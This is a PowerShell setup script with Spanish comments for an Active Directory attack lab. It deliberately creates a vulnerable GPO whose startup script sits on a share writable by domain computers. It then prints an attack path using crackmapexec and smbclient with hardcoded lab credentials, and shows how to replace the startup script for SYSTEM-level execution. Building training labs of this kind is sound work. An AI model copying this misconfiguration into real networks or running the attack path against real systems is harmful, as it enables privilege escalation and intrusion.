Write-Host "============================================" -ForegroundColor Yellow
Write-Host "  AD Attack Lab - FILE01 / 04_gpo_misconfiguration.ps1" -ForegroundColor Yellow
Write-Host "  Solo para uso en laboratorio controlado" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Yellow

Write-Host "`n[BLOQUE 4] Configurando GPO vulnerable..." -ForegroundColor Cyan

$DCSession = New-PSSession -ComputerName "10.10.10.10" `
-Credential (Get-Credential -Message "Credenciales de Domain Admin" -UserName "CORP\Administrator")

Invoke-Command -Session $DCSession -ScriptBlock {

```
Import-Module GroupPolicy

$GPO = New-GPO -Name "IT-Tools-Startup" -Comment "Lab misconfiguration - startup script"

New-GPLink -Name "IT-Tools-Startup" -Target "DC=corp,DC=local" -LinkEnabled Yes

Set-GPRegistryValue `
    -Name "IT-Tools-Startup" `
    -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
    -ValueName "ITStartup" `
    -Type String `
    -Value "\\FILE01\it-tools\startup.bat"

Write-Host "[!] MISCONFIGURACION: GPO IT-Tools-Startup apunta a \\FILE01\it-tools\startup.bat" -ForegroundColor Red
Write-Host "    Domain Computers tiene Write sobre ese share" -ForegroundColor Red
Write-Host "    Vector: modificar startup.bat -> ejecucion como SYSTEM en el boot" -ForegroundColor Red
```

}

$StartupContent = @"
@echo off
REM IT Tools Startup Script
REM Ejecutado como SYSTEM en cada boot via GPO
net use Z: \FILE01\data /persistent:yes
"@

$StartupContent | Out-File "C:\Shares\it-tools\startup.bat" -Encoding ASCII

Write-Host "[!] LOOT: C:\Shares\it-tools\startup.bat creado (reemplazable por atacante)" -ForegroundColor Red
Write-Host "[+] GPO misconfiguration configurada" -ForegroundColor Green
Write-Host ""
Write-Host "Attack path GPO:" -ForegroundColor White
Write-Host "  crackmapexec smb 10.10.10.20 -u j.smith -p 'Password123!' --shares" -ForegroundColor Gray
Write-Host "  smbclient \\10.10.10.20\it-tools -U 'CORP\j.smith%Password123!'" -ForegroundColor Gray
Write-Host "  put evil.bat startup.bat <- reemplazar script de inicio" -ForegroundColor Gray
Write-Host ""
Write-Host "Siguiente paso: correr 05_winrm_misconfiguration.ps1" -ForegroundColor Cyan

